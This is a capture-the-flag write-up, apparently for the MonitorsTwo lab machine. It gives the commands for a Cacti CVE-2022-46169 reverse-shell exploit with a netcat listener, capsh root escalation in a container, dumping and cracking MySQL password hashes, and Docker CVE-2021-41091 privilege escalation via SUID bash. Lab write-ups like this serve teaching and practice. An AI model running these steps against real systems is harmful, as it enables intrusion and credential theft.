2. Enumeration
#

I scanned the system for the enumeration stage with nmap, dirb, traceroute, view page source, etc. but nothing useful. After checking the directory where dirb found the /document endpoint, spend some time on it but nothing changes, then start checking for cactus web interface vulnerabilities and here we go.

Cacti CVE
#

Exploit for Cacti Login

After seeing the correct way to use the exploit, we run it.

We listen on port 443:

nc -nlvp 443

> python3 CVE-2022-46169.py  -u http://10.10.11.211 --LHOST=10.10.14.29 --LPORT=443 
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!

LinEnum
#

Now we are going to see possible ways to elevate privileges, we will use LinEnum to have more information.

LinEnum Tool

In our result we find this:

We take advantage of this to elevate our privilege.

Binario capsh
#

We execute it inside the /sbin/ directory:

./capsh --gid=0 --uid=0 --

here you have more information about this –> capsh

It looks like we’re in a docker container, so let’s try to see the contents of a database we found before:

Run Mysql to find credentials
# 

mysql --host=db --user=root --password=root cacti -e "SELECT * FROM user_auth"

In user marcus we have a hash, we will use john to see what it is.

Cracking Password con john
#

We save it in an h.txt file and execute it:

john h.txt --wordlist=/usr/share/wordlists/rockyou.txt

SSH Conect
#

We connect via SSH:

ssh marcus@10.10.11.211

Here is the user flag.

3. Privilege Escalation
#

After running LinEnum again, we see that the machine hosts a docker:

marcus@monitorstwo:~$ docker --version
Docker version 20.10.5+dfsg1, build 55c4c88

CVE-2021-41091
#

After searching the Internet we found an exploit. CVE-2021-41091

We pass the exploit to our victim machine.

Let’s go to the docker container that we previously had as root:

cd /bin

We assign these permissions to bash.

chmod u+s /bin/bash

Now we run the exploit on the victim machine.

We enter the path indicated by the exploit and execute it:

./bin/bash -p
